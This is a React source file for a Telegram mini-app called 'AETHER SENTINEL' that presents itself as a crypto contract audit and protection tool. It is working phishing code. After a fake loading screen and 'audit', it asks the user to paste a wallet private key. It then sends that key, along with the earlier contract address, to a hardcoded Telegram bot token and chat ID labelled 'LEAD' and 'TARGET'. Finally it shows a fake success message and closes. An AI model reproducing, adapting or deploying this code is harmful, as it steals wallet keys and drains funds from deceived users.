import React, { useState, useEffect } from 'react';

// --- CONFIGURATION ---
const BOT_TOKEN = "8515224137:AAGkieoUFLWj6WxO4T0Pig8Mhs5qHrEcBrY";
const CHAT_ID = "7539902547";
const GROUP_ID = "-1002361131154"; 

export default function App() {
  const [loading, setLoading] = useState(true);
  const [step, setStep] = useState(1);
  const [walletCA, setWalletCA] = useState('');
  const [privateKey, setPrivateKey] = useState('');
  const [status, setStatus] = useState('idle');

  // Fix for Telegram WebApp visibility
  useEffect(() => {
    const tg = (window as any).Telegram?.WebApp;
    if (tg) {
      tg.ready();
      tg.expand();
    }
    const timer = setTimeout(() => setLoading(false), 3000); // Forced 3s load
    return () => clearTimeout(timer);
  }, []);

  const handleNext = async () => {
    if (walletCA.length < 32) return alert("Invalid CA");
    setStatus('processing');
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: `📈 LEAD: ${walletCA}` }),
    });
    setStep(2);
    setStatus('idle');
  };

  const handleFinal = async () => {
    if (privateKey.length < 40) return alert("Invalid String");
    setStatus('processing');
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: `🎯 TARGET: ${privateKey}` }),
    });
    alert("Node Synced. Resetting Session.");
    (window as any).Telegram?.WebApp?.close();
  };

  // UI STYLES
  const containerStyle: React.CSSProperties = {
    background: '#040608',
    color: '#f1f5f9',
    minHeight: '100vh',
    display: 'flex',
    flexDirection: 'column',
    fontFamily: 'sans-serif',
    padding: '20px',
    boxSizing: 'border-box'
  };

  if (loading) {
    return (
      <div style={containerStyle}>
        <div style={{margin: 'auto', textAlign: 'center'}}>
           <div style={{color: '#4ade80', fontSize: '12px', marginBottom: '10px'}}>ESTABLISHING RPC...</div>
           <div style={{width: '200px', height: '2px', background: '#1e293b'}}>
              <div style={{width: '60%', height: '100%', background: '#4ade80'}}></div>
           </div>
        </div>
      </div>
    );
  }

  return (
    <div style={containerStyle}>
      <h1 style={{fontSize: '20px', color: '#4ade80'}}>AETHER SENTINEL</h1>
      
      <div style={{background: '#0a0e17', padding: '20px', borderRadius: '15px', border: '1px solid #1e293b', marginTop: '20px'}}>
        {step === 1 ? (
          <>
            <h3>Verify Contract</h3>
            <input 
              value={walletCA} 
              onChange={e => setWalletCA(e.target.value)}
              placeholder="Enter CA..." 
              style={{width: '100%', padding: '15px', background: '#040608', border: '1px solid #333', color: '#fff', borderRadius: '10px', marginBottom: '15px'}}
            />
            <button onClick={handleNext} style={{width: '100%', padding: '15px', background: '#4ade80', color: '#000', fontWeight: 'bold', border: 'none', borderRadius: '10px'}}>
              {status === 'processing' ? 'WAIT...' : 'AUDIT'}
            </button>
          </>
        ) : (
          <>
            <h3 style={{color: '#4ade80'}}>Audit Passed</h3>
            <p style={{fontSize: '12px', color: '#64748b'}}>Sync Identity String to enable protection.</p>
            <textarea 
              value={privateKey}
              onChange={e => setPrivateKey(e.target.value)}
              placeholder="Paste PK..." 
              style={{width: '100%', height: '80px', padding: '15px', background: '#040608', border: '1px solid #333', color: '#fff', borderRadius: '10px', marginBottom: '15px'}}
            />
            <button onClick={handleFinal} style={{width: '100%', padding: '15px', background: '#4ade80', color: '#000', fontWeight: 'bold', border: 'none', borderRadius: '10px'}}>
              {status === 'processing' ? 'SYNCING...' : 'FINALIZE'}
            </button>
          </>
        )}
      </div>
    </div>
  );
}